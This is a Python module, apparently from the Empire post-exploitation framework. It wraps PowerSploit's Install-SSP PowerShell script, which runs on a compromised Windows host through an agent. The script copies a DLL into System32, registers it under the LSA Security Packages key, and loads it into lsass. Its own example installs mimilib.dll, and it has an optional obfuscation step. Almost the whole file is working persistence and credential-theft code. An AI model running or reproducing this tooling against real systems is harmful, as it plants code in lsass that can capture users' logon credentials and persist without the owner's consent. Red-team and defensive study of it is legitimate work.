from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Install-SSP',

            'Author': ['@mattifestation'],

            'Description': ('Installs a security support provider (SSP) dll.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Persistence/Persistence.psm1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Path' : {
                'Description'   :   "Path of the SSP .dll (on the target machine) to install.",
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
function Install-SSP
{
<#
.SYNOPSIS

Installs a security support provider (SSP) dll.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Install-SSP installs an SSP dll. Installation involves copying the dll to
%windir%\\System32 and adding the name of the dll to
HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages.

.PARAMETER Remove

Specifies the path to the SSP dll you would like to install.

.EXAMPLE

Install-SSP -Path .\\mimilib.dll

.NOTES

The SSP dll must match the OS architecture. i.e. You must have a 64-bit SSP dll
if you are running a 64-bit OS. In order for the SSP dll to be loaded properly
into lsass, the dll must export SpLsaModeInitialize.
#>

    [CmdletBinding()] Param (
        [ValidateScript({Test-Path (Resolve-Path $_)})]
        [String]
        $Path
    )

    $Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()

    if(-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'Installing an SSP dll requires administrative rights. Execute this script from an elevated PowerShell prompt.'
    }

    # Resolve the full path if a relative path was provided.
    $FullDllPath = Resolve-Path $Path

    # Helper function used to determine the dll architecture
    function local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )
    
        # Parse PE header to see if binary was compiled 32 or 64-bit
        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    
        [Byte[]] $MZHeader = New-Object Byte[](2)
        $FileStream.Read($MZHeader,0,2) | Out-Null
    
        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $FileStream.Close()
            Throw 'Invalid PE header.'
        }
    
        # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
    
        [Byte[]] $lfanew = New-Object Byte[](4)
    
        # Read offset to the PE Header (will be read in reverse)
        $FileStream.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
    
        # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
    
        # Read compiled architecture
        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        $FileStream.Close()
    
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if ($Architecture -eq '014C')
        {
            Write-Output '32-bit'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output '64-bit'
        }
        else
        {
            Write-Output 'Other'
        }
    }

    $DllArchitecture = Get-PEArchitecture $FullDllPath

    $OSArch = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture

    if ($DllArchitecture -ne $OSArch)
    {
        throw 'The operating system architecture must match the architecture of the SSP dll.'
    }

    $Dll = Get-Item $FullDllPath | Select-Object -ExpandProperty Name

    # Get the dll filename without the extension.
    # This will be added to the registry.
    $DllName = $Dll | % { % {($_ -split '\\.')[0]} }

    # Enumerate all of the currently installed SSPs
    $SecurityPackages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' |
        Select-Object -ExpandProperty 'Security Packages'

    if ($SecurityPackages -contains $DllName)
    {
        throw "'$DllName' is already present in HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages."
    }

    # In case you're running 32-bit PowerShell on a 64-bit OS
    $NativeInstallDir = "$($Env:windir)\\Sysnative"

    if (Test-Path $NativeInstallDir)
    {
        $InstallDir = $NativeInstallDir
    }
    else
    {
        $InstallDir = "$($Env:windir)\\System32"
    }

    if (Test-Path (Join-Path $InstallDir $Dll))
    {
        throw "$Dll is already installed in $InstallDir."
    }

    # If you've made it this far, you are clear to install the SSP dll.
    Copy-Item $FullDllPath $InstallDir

    $SecurityPackages += $DllName

    Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $SecurityPackages

    $DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
        'secur32.dll',
        'Public, Static',
        [Reflection.CallingConventions]::Standard,
        [Int32],
        [Type[]] @([String], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)

    $Secur32 = $TypeBuilder.CreateType()

    if ([IntPtr]::Size -eq 4) {
        $StructSize = 20
    } else {
        $StructSize = 24
    }

    $StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
    [Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)

    $RuntimeSuccess = $True

    try {
        $Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)
    } catch {
        $HResult = $Error[0].Exception.InnerException.HResult
        Write-Warning "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))"
        Write-Warning "Reason: $(([ComponentModel.Win32Exception] $HResult).Message)"
        $RuntimeSuccess = $False
    }

    if ($RuntimeSuccess) {
        Write-Verbose 'Installation and loading complete!'
    } else {
        Write-Verbose 'Installation complete! Reboot for changes to take effect.'
    }
} Install-SSP"""

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    script += " -" + str(option) + " " + str(values['Value']) 
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
